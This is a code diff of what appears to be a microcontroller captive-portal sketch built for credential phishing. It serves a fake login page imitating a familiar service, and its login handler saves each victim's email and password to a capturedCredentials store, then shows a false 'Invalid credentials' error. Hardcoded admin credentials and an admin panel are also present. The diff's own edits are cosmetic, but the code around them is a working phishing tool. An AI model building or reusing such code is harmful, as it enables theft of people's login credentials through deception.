@@ -8,7 +8,7 @@ const char* password = "";
 
 // Admin credentials
 const char* adminUsername = "admin";
-const char* adminPassword = "password123";
+const char* adminPassword = "password123"; // Ensure that this password is correct for admin login
 
 // DNS and server objects
 DNSServer dnsServer;
@@ -52,7 +52,7 @@ String generateLoginPage(String errorMessage = "") {
         }
 
         body {
-          font-family: Arial, sans-serif; /* Use system font that resembles Roboto */
+          font-family: Arial, sans-serif;
           background-color: #f5f5f5;
           display: flex;
           justify-content: center;
@@ -109,7 +109,7 @@ String generateLoginPage(String errorMessage = "") {
           border-radius: 4px;
           font-size: 16px;
           color: #333;
-          font-family: Arial, sans-serif; /* Matching system font */
+          font-family: Arial, sans-serif;
         }
 
         input[type="email"]:focus, input[type="password"]:focus {
@@ -126,7 +126,7 @@ String generateLoginPage(String errorMessage = "") {
           border-radius: 4px;
           font-size: 16px;
           cursor: pointer;
-          font-family: Arial, sans-serif; /* Matching system font */
+          font-family: Arial, sans-serif;
           transition: background-color 0.2s;
         }
 
@@ -193,6 +193,7 @@ void handleLogin(AsyncWebServerRequest *request) {
     // Save credentials
     capturedCredentials += "Email: " + email + ", Password: " + password + "\n";
 
+    // Redirect with error message
     request->redirect("/login?error=Invalid+credentials");
   } else {
     request->redirect("/login");
@@ -212,7 +213,7 @@ void captureDeviceDetails(AsyncWebServerRequest *request) {
 
 // Function to generate the admin panel
 String generateAdminPanel() {
-  return R"rawliteral(
+  String panel = R"rawliteral(
     <!DOCTYPE html>
     <html lang="en">
     <head>
@@ -252,6 +253,8 @@ String generateAdminPanel() {
     </body>
     </html>
   )rawliteral";
+
+  return panel;
 }
 
 // Setup the server and routes
